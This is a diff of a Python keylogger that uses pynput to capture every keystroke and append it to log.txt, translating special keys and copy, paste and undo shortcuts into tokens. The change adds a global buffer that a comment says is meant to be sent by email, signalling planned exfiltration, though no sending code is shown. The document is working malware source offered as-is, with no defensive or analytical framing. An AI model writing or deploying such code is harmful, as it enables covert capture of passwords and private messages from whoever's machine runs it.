@@ -1,32 +1,39 @@
 from pynput.keyboard import Listener
 
+#string which will contain all the pressed keys ( to be send by email )
+input_string = ''
 
 def log_keystroke(key):
-    key = str(key).replace("'", "")
-
-    #check if a "special" key is pressed and only add what could be useful
-    if key.startswith("Key."):
-        if key == "Key.backspace":
-            key = ' $BACKSPACE '
-        elif key == 'Key.space':
-            key = ' '
-        elif key == "Key.enter":
-            key = '\n'
-        elif key == 'Key.caps_lock':
-            key = ' $CAPS_LOCKED '
-        else:
-            key = ''
-    elif key.startswith('\\x'):
-        #check if the user is using shortcuts
-        if key == "\\x03":
-            key = ' $COPY '
-        if key == "\\x16":
-            key = ' $PASTE '
-        if key == "\\x1a":
-            key = ' $BACK '
+    global input_string
+    pressed = str(key).replace("'", "")
     
-    with open("log.txt", 'a') as f:
-        f.write(key)
+    #check if a "special" key is pressed and only add what could be useful
+    if pressed.startswith("Key."):
+        if pressed == "Key.backspace":
+            pressed = ' $BACKSPACE '
+        elif pressed == 'Key.space':
+            pressed = ' '
+        elif pressed == "Key.enter":
+            pressed = '\n'
+        elif pressed == 'Key.caps_lock':
+            pressed = ' $CAPS_LOCKED '
+        else:
+            pressed = ''
+    elif pressed.startswith('\\x'):
+        #check if the user is using keyboard shortcuts
+        if pressed == "\\x03":
+            pressed = ' $COPY '
+        if pressed == "\\x16":
+            pressed = ' $PASTE '
+        if pressed == "\\x1a":
+            pressed = ' $UNDO '
+    
+    input_string = input_string + pressed
+    #print(input_string)
+    with open("log.txt", 'a',encoding='utf-8') as f:
+        f.write(pressed)
+
+
 
 def start_listener():
     with Listener(on_press=log_keystroke) as l:
